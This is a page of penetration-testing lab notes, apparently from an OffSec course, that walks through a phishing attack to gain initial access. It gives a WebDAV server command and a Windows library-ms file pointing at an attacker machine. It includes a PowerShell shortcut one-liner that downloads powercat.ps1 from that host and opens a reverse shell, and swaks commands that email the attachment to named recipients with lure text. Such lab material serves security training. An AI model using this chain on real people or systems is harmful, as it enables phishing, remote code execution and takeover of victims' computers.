# Send email

Phishing for access

{% code title=" Starting WsgiDAV on port 80" overflow="wrap" lineNumbers="true" %}
```
┌──(kali㉿kali)-[~/offsec/beyond]
└─$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/offsec/beyond/webdav/

```
{% endcode %}

Now, let's copy the Windows Library code we previously used in the Client-Side Attacks Module, paste it into Visual Studio Code, and check that the IP address points to our Kali machine.

{% code title="Windows Library code for connecting to our WebDAV Share" overflow="wrap" lineNumbers="true" %}
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
{% endcode %}



Let's save the file and transfer it to /home/kali/beyond on our Kali machine.

Next, we'll create the shortcut file on WINPREP. For this, we'll right-click on the Desktop and select New > Shortcut. A victim double-clicking the shortcut file will download PowerCat and create a reverse shell. We can enter the following command to achieve this:

{% code title="" overflow="wrap" lineNumbers="true" %}
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```
{% endcode %}

Once we enter the command and install as shortcut file name, we can transfer the resulting shortcut file to our Kali machine into the WebDAV directory.

Our next step is to serve PowerCat via a Python3 web server. Let's copy powercat.ps1 to /home/kali/beyond and serve it on port 8000 as we have specified in the shortcut's PowerShell command.

{% code title="Serving powercat.ps1 on port 8000 via Python3 web server" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

kali@kali:~/beyond$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```
swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -attach @config.library-ms --server 192.168.x.x --body "Please run file" --header "Subject: Problems"
swaks --to dave.wizard@supermagicorg.com --from test@supermagicorg.com --auth-password test -attach config.Library-ms --server 192.168.200.199 --body "please click here" --header "Subject: Staging Script" -ap
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.237.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

```
{% endcode %}
